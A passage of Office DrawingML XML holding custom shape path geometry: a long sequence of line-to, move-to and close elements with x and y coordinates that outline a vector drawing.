                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="1982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="1982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="1285"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="1065"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4990" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="808"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9648" y="3302"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="4293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="4293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="3302"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1505" y="4329"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1615" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="5100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="5210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1432" y="4329"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1138" y="5576"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1138" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="5576"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7887" y="5907"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8218" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="6934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="7741"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="6934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="6934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="5907"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4953" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4733" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="258" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="845" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1175" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="5210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="6934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="7741"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7191" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10419" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7411" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="3486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
